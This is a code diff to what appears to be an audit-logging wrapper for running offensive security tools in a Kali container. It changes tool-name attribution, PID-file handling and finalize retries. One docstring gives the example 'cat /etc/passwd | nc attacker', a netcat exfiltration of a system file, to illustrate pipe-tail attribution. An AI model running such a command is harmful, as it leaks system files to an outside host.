@@ -56,60 +56,122 @@ def _is_plausible_executable(token: str) -> bool:
     return True
 
 
+def _scan_inner_for_first_exec(inner: list[str]) -> tuple[str | None, bool]:
+    """Walk a parsed shell `-c` argv and return (first_executable, indeterminate).
+
+    ``indeterminate`` is True when the head token is a bash variable
+    expansion (e.g. ``$tool``), which means the real binary only resolves at
+    runtime and the audit row should flag the ambiguity.
+    """
+    skip_until_after: str | None = None
+    skip_next = False
+    iterations_left = 128
+    i = 0
+    while i < len(inner) and iterations_left > 0:
+        iterations_left -= 1
+        part = inner[i]
+        if skip_next:
+            skip_next = False
+            i += 1
+            continue
+        if part in {">", "<", ">>", "<<", "2>", "2>>", "&>", "&>>", "<&", ">&"}:
+            skip_next = True
+            i += 1
+            continue
+        if part in {"for", "while", "until"}:
+            skip_until_after = "do"
+            i += 1
+            continue
+        if part == "if":
+            skip_until_after = "then"
+            i += 1
+            continue
+        if skip_until_after is not None:
+            if part == skip_until_after:
+                skip_until_after = None
+            i += 1
+            continue
+        if part.startswith("$"):
+            return part, True
+        if _is_plausible_executable(part):
+            return part, False
+        i += 1
+    return None, False
+
+
+def _split_inner_pipeline_stages(inner: list[str]) -> list[list[str]]:
+    """Split a parsed shell `-c` argv on bare ``|`` tokens. Other operators
+    (``&&``/``||``/``;``) are NOT stage boundaries — only `|` triggers the
+    pipe-tail attribution rule. Returns the list of stage argvs in order."""
+    stages: list[list[str]] = [[]]
+    for token in inner:
+        if token == "|":
+            stages.append([])
+            continue
+        stages[-1].append(token)
+    return [s for s in stages if s]
+
+
 def _derive_tool_name(cmd: list[str]) -> str:
     """Pick the human-meaningful tool name from a command argv.
 
     Default: first argv token. Override: when the first token is a shell
-    binary and a `-c` argument is present, parse the inner command and pick
-    the first plausibly-executable token, skipping shell keywords
-    (`for`/`while`/`if`/...), env-var prefixes (`FOO=bar`), redirection
-    operators, and bare loop-iteration variables. Falls back to the shell
-    binary itself if no plausible executable is found inside `-c`.
+    binary and a `-c` argument is present:
+
+    - if the inner command contains a bare ``|`` token, attribute to the
+      LAST pipeline stage's executable (so `cat /etc/passwd | nc attacker`
+      attributes to ``nc``, matching the operator-meaningful exfil tool);
+    - otherwise return the first plausibly-executable token, skipping shell
+      keywords, env-var prefixes, redirection operators, and bare loop-
+      iteration variables.
+
+    Falls back to the shell binary itself if no plausible executable is
+    found inside `-c`.
+    """
+    name, _meta = _analyze_tool_name(cmd)
+    return name
+
+
+def _analyze_tool_name(cmd: list[str]) -> tuple[str, dict[str, Any]]:
+    """Same selection logic as ``_derive_tool_name`` plus a metadata dict
+    with ``shell_pipeline_tools`` (every pipe stage's head, in order) and
+    ``tool_name_indeterminate`` (True when the chosen head is a bash
+    variable expansion that only resolves at runtime).
     """
     if not cmd:
-        return "command"
+        return "command", {}
     first = cmd[0]
     if first not in _SHELL_BINARIES:
-        return first
+        return first, {}
     for idx, token in enumerate(cmd[1:-1], start=1):
         if token == "-c":
             try:
                 inner = shlex.split(cmd[idx + 1])
             except ValueError:
-                return first
-            skip_until_after = None
-            skip_next = False
-            iterations_left = 64
-            i = 0
-            while i < len(inner) and iterations_left > 0:
-                iterations_left -= 1
-                part = inner[i]
-                if skip_next:
-                    skip_next = False
-                    i += 1
-                    continue
-                if part in {">", "<", ">>", "<<", "2>", "2>>", "&>", "&>>", "<&", ">&"}:
-                    skip_next = True
-                    i += 1
-                    continue
-                if part in {"for", "while", "until"}:
-                    skip_until_after = "do"
-                    i += 1
-                    continue
-                if part == "if":
-                    skip_until_after = "then"
-                    i += 1
-                    continue
-                if skip_until_after is not None:
-                    if part == skip_until_after:
-                        skip_until_after = None
-                    i += 1
-                    continue
-                if _is_plausible_executable(part):
-                    return part
-                i += 1
-            return first
-    return first
+                return first, {}
+            if "|" in inner:
+                stages = _split_inner_pipeline_stages(inner)
+                heads: list[str] = []
+                indeterminate = False
+                for stage in stages:
+                    head, stage_indeterminate = _scan_inner_for_first_exec(stage)
+                    if head is not None:
+                        heads.append(head)
+                        indeterminate = indeterminate or stage_indeterminate
+                if not heads:
+                    return first, {}
+                meta: dict[str, Any] = {"shell_pipeline_tools": list(heads)}
+                if indeterminate:
+                    meta["tool_name_indeterminate"] = True
+                return heads[-1], meta
+            head, indeterminate = _scan_inner_for_first_exec(inner)
+            if head is None:
+                return first, {}
+            meta = {}
+            if indeterminate:
+                meta["tool_name_indeterminate"] = True
+            return head, meta
+    return first, {}
 
 
 # Test-mode override: when set, skips both audit POST and `docker exec` so
@@ -307,15 +369,22 @@ def _build_docker_exec(
     Without this, tools that trap SIGTERM (sqlmap, nuclei) survive the
     host-side process-group kill because they never see a signal."""
     pid_file = _container_pid_file(run_uuid)
+    # Two-prong wrapper: try to record the in-container PID for the timeout
+    # cascade, but never let a pid-write failure (ENOSPC, read-only /tmp,
+    # missing dir) stop the user command from running. If the write fails,
+    # surface the reason on stderr so orphan analysis isn't a silent guess.
     if strace:
         strace_log = _container_strace_file(run_uuid)
-        wrapper = (
-            f'echo $$ > {pid_file}; '
+        tail = (
             f'exec strace -f -e trace=network,write,unlink '
             f'-o {strace_log} "$@"'
         )
     else:
-        wrapper = f'echo $$ > {pid_file}; exec "$@"'
+        tail = 'exec "$@"'
+    wrapper = (
+        f'echo $$ > {pid_file} && {tail} || '
+        f'(echo "aith: PID write to {pid_file} failed (errno=$?); proceeding without pid-file" >&2; {tail})'
+    )
     return [
         "docker",
         "exec",
@@ -490,7 +559,9 @@ def _patch_finalize(
         payload["cpu_system_seconds"] = float(cpu_system_seconds)
     if strace_path:
         payload["strace_path"] = strace_path
-    return client.patch(f"command-runs/{int(run_id)}", payload)
+    # 409 from the finalize endpoint means a concurrent finalize already
+    # wrote the canonical row — accept it and return that row, do not raise.
+    return client.patch(f"command-runs/{int(run_id)}", payload, accept_409=True)
 
 
 def _build_preview(text: str, *, head_bytes: int = 4096, tail_bytes: int = 4096) -> str:
@@ -794,6 +865,9 @@ def kali_exec(
                     strace_path=str(strace_path) if strace_path else None,
                 )
             except AssessError as exc:
+                # 409 races are now handled inside _patch_finalize; reaching
+                # this branch means a real failure (network, 4xx other than
+                # 409, 5xx exhaustion) and the row may genuinely need sweep.
                 print(
                     f"warning: finalize PATCH failed: {exc}; row stays running and may need orphan sweep.",
                     file=sys.stderr,
@@ -902,11 +976,38 @@ def add_passthrough_args_flag(parser) -> None:
     )
 
 
-def extend_cmd_with_extra_args(cmd: list[str], args) -> list[str]:
-    """Append shlex-split extra args to cmd if the namespace has any."""
+def extend_cmd_with_extra_args(
+    cmd: list[str],
+    args,
+    *,
+    typed_short_flags: set[str] | None = None,
+) -> list[str]:
+    """Append shlex-split extra args to cmd if the namespace has any.
+
+    When ``typed_short_flags`` is provided, scan the split tokens for short
+    flags (``-x``) that overlap with the verb's typed argparse spec and emit
+    a stderr WARN so the operator notices the silent override. Passthrough
+    is still permitted — duplicate flags are common when a typed verb does
+    not yet model every option.
+    """
     extra = getattr(args, "extra_args", "") or ""
-    if extra:
-        cmd.extend(shlex.split(extra))
+    if not extra:
+        return cmd
+    try:
+        split = shlex.split(extra)
+    except ValueError as exc:
+        raise AssessError(f"--extra-args: invalid shell quoting: {exc}") from exc
+    if typed_short_flags:
+        seen_collisions: set[str] = set()
+        for token in split:
+            if token in typed_short_flags and token not in seen_collisions:
+                print(
+                    f"warning: --extra-args contains '{token}' which is also a typed flag on this verb; "
+                    "the passthrough value will be appended after the typed value.",
+                    file=sys.stderr,
+                )
+                seen_collisions.add(token)
+    cmd.extend(split)
     return cmd
 
 
